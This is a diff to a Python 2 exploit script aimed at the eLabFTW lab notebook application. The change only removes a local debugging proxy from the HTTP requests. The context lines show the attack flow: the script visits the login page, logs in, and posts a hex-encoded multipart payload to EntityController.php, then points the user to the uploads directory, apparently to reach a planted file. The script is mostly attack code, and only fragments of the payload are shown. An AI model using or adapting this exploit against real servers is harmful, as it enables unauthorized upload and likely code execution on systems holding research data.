@@ -50,8 +50,6 @@ except IndexError:
 	sys.exit()
 
 
-proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
-
 # The payload to send
 data = ""
 data += "\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d"
@@ -99,7 +97,7 @@ data += "\x31\x36\x33\x30\x33\x39\x35\x30\x37\x37\x2d\x2d\x0d\x0a"
 s = requests.Session()
 
 print "[*] Visiting eLabFTW Site"
-r = s.get('https://' + target + '/' + directory + '/login.php',verify=False, proxies=proxies)
+r = s.get('https://' + target + '/' + directory + '/login.php',verify=False)
 print "[x]"
 
 # Grabbing token
@@ -115,7 +113,7 @@ time.sleep(2)
 
 print "[*] Logging in to eLabFTW"
 
-r = s.post('https://' + target + '/' + directory + '/app/controllers/LoginController.php', data=values, verify=False, proxies=proxies)
+r = s.post('https://' + target + '/' + directory + '/app/controllers/LoginController.php', data=values, verify=False)
 
 print "[x] Logged in :)"
 
@@ -140,7 +138,7 @@ headers = {
 }
 
 print "[*] Sending payload..."
-r = s.post('https://' + target + '/' + directory + '/app/controllers/EntityController.php',verify=False, headers=headers, data=data, proxies=proxies)
+r = s.post('https://' + target + '/' + directory + '/app/controllers/EntityController.php',verify=False, headers=headers, data=data)
 print "[x] Payload sent"
 print
 print "Now check https://%s/%s/uploads" % (target, directory)
